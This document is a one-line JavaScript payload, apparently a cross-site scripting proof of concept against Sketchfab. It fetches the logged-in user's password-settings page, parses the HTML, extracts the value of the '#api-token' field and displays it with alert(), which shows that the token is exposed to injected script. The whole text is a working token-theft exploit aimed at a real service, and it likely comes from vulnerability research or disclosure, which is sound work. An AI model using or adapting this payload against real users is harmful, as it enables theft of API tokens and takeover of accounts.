fetch("https://sketchfab.com/settings/password").then(function(t){return t.text()}).then(function(t){var e=(new DOMParser).parseFromString(t,"text/html").querySelector("#api-token").value;alert(e)});
